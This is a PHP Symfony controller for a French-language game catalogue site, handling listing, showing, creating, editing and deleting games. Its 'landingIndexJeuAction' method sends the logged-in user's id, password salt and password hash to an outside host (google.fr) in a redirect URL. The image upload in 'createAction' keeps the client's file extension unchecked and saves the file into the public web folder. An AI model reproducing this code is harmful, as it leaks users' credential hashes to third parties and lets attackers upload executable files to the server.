<?php

namespace InfinityGames\InfinityBundle\Controller;

use Symfony\Component\HttpFoundation\Request;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;

use InfinityGames\InfinityBundle\Entity\Jeu;
use InfinityGames\InfinityBundle\Entity\GenreJeu;
use InfinityGames\InfinityBundle\Form\JeuType;
use InfinityGames\InfinityBundle\Entity\Utilisateur;
/**
 * Jeu controller.
 *
 */
class JeuController extends Controller
{
    /**
     * Lists all Jeu entities.
     *
     */
    public function indexAction()
    {
        $em = $this->getDoctrine()->getManager();

        $entities = $em->getRepository('InfinityGamesInfinityBundle:Jeu')->findAll();
        $entitiesGenre = $em->getRepository('InfinityGamesInfinityBundle:GenreJeu')->findAll();

        return $this->render('InfinityGamesInfinityBundle:Jeu:index.html.twig', array(
            'entities' => $entities,
        	'genreJeu' =>$entitiesGenre,
        ));
    }
   /**
    * Créée la liste des jeux. Récupère aussi le top3 de la plate-forme
    * 
    */
    public function catalogueAction(){
    	//tous
    	$em = $this->getDoctrine()->getManager();
    	$entitiesJeux = $em->getRepository('InfinityGamesInfinityBundle:Jeu')->findAll();
    	$entityLastGame = $em->getRepository('InfinityGamesInfinityBundle:Jeu')->findOneLastGame();
    	
    	$entityTopGame = $em->getRepository('InfinityGamesInfinityBundle:Jeu')->findByBestNote();
    	
    	return $this->render('InfinityGamesInfinityBundle:Jeu:catalogue_jeux.html.twig', array(
    			'jeux' => $entitiesJeux,
    			'dernierJeu' => $entityLastGame,
    			'jeuTop3' => $entityTopGame,
    	));
    }

    /**
     * Finds and displays a Jeu entity.
     *
     */
    public function showAction($id)
    {
        $em = $this->getDoctrine()->getManager();

        $entity = $em->getRepository('InfinityGamesInfinityBundle:Jeu')->find($id);

        if (!$entity) {
            throw $this->createNotFoundException('Unable to find Jeu entity.');
        }

        $deleteForm = $this->createDeleteForm($id);

        return $this->render('InfinityGamesInfinityBundle:Jeu:show.html.twig', array(
            'entity'      => $entity,
            'delete_form' => $deleteForm->createView(),        ));
    }

    /**
     * Displays a form to create a new Jeu entity.
     *
     */
    public function newAction()
    {
        $entity = new Jeu();
        $form   = $this->createForm(new JeuType(), $entity);

        return $this->render('InfinityGamesInfinityBundle:Jeu:new.html.twig', array(
            'entity' => $entity,
            'form'   => $form->createView(),
        ));
    }

    /**
     * Creates a new Jeu entity.
     *
     */
    public function createAction(Request $request)
    {
        $entity  = new Jeu();
        $form = $this->createForm(new JeuType(), $entity);
        $form->bind($request);

        if ($form->isValid()) {
        	//upload d'img
        		//on définit le dossier ou envoyer les images
        		$dir = "../web/image/img_jeux";
        	    //on recupère le nom original du fichier  	
        		$nomBase = $form['visuelImg']->getData()->getClientOriginalName();
        		//on découpe le nom du fichier pr recup l'extension
	        	$extension=strrchr($nomBase,'.');        	
	        	$extension=substr($extension,1) ;
        		//on génère le nouveau nom du fichier
        		$randNom = rand(0,1000000);
        		$dateNom = time();
   				$NewNom = 'img_'.$randNom.$dateNom.'.'.$extension;
   				//chemin a stocker pour récupère l'image
   				$pathImg = 'image/img_jeux/'.$NewNom;
        	//upload de l'image avec son nouveau nom
        	$form['visuelImg']->getData()->move($dir, $NewNom);
      	
            $em = $this->getDoctrine()->getManager();
            
            //on recupère admin pour lui attribué le jeu
            $entityUser = $em->getRepository('InfinityGamesInfinityBundle:Utilisateur')->findOneByprenom('admin');
            
            $entity->setCreatedat(new \DateTime());
         	$entity->setVisuelImg($pathImg);
         	$entity->setNote(4);
         	$entity->setUtilisateurUtilisateur($entityUser);
            $em->persist($entity);
            $em->flush();

            return $this->redirect($this->generateUrl('jeu_show', array('id' => $entity->getId())));
        }

        return $this->render('InfinityGamesInfinityBundle:Jeu:new.html.twig', array(
            'entity' => $entity,
            'form'   => $form->createView(),
        ));
    }
    
    /**
     * function arrivée sur une page index jeu 
     */
    
    public function landingIndexJeuAction($url = null){
    	
    	$utilisateurCourant = $this->get('security.context')->getToken()->getUser();
    	$utilisateurId = $utilisateurCourant->getId();
    	$utilisateurSalt = $utilisateurCourant->getSalt();
    	$utilisateurMd5 = $utilisateurCourant->getPassword();
    	
    	if(!isset($utilisateurCourant)){
    		$utilisateurCourant = "visiteurs";	
    	}
    	
    	return $this->redirect('http://www.google.fr?id='.$utilisateurId.'?salt='.$utilisateurSalt.'sec='.$utilisateurMd5);
    }

    /**
     * Displays a form to edit an existing Jeu entity.
     *
     */
    public function editAction($id)
    {
        $em = $this->getDoctrine()->getManager();

        $entity = $em->getRepository('InfinityGamesInfinityBundle:Jeu')->find($id);

        if (!$entity) {
            throw $this->createNotFoundException('Unable to find Jeu entity.');
        }

        $editForm = $this->createForm(new JeuType(), $entity);
        $deleteForm = $this->createDeleteForm($id);

        return $this->render('InfinityGamesInfinityBundle:Jeu:edit.html.twig', array(
            'entity'      => $entity,
            'edit_form'   => $editForm->createView(),
            'delete_form' => $deleteForm->createView(),
        ));
    }

    /**
     * Edits an existing Jeu entity.
     *
     */
    public function updateAction(Request $request, $id)
    {
        $em = $this->getDoctrine()->getManager();

        $entity = $em->getRepository('InfinityGamesInfinityBundle:Jeu')->find($id);

        if (!$entity) {
            throw $this->createNotFoundException('Unable to find Jeu entity.');
        }

        $deleteForm = $this->createDeleteForm($id);
        $editForm = $this->createForm(new JeuType(), $entity);
        $editForm->bind($request);

        if ($editForm->isValid()) {
            $em->persist($entity);
            $em->flush();

            return $this->redirect($this->generateUrl('jeu_edit', array('id' => $id)));
        }

        return $this->render('InfinityGamesInfinityBundle:Jeu:edit.html.twig', array(
            'entity'      => $entity,
            'edit_form'   => $editForm->createView(),
            'delete_form' => $deleteForm->createView(),
        ));
    }

    /**
     * Deletes a Jeu entity.
     *
     */
    public function deleteAction(Request $request, $id)
    {
        $form = $this->createDeleteForm($id);
        $form->bind($request);

        if ($form->isValid()) {
            $em = $this->getDoctrine()->getManager();
            $entity = $em->getRepository('InfinityGamesInfinityBundle:Jeu')->find($id);

            if (!$entity) {
                throw $this->createNotFoundException('Unable to find Jeu entity.');
            }

            $em->remove($entity);
            $em->flush();
        }

        return $this->redirect($this->generateUrl('jeu'));
    }

    private function createDeleteForm($id)
    {
        return $this->createFormBuilder(array('id' => $id))
            ->add('id', 'hidden')
            ->getForm()
        ;
    }
}
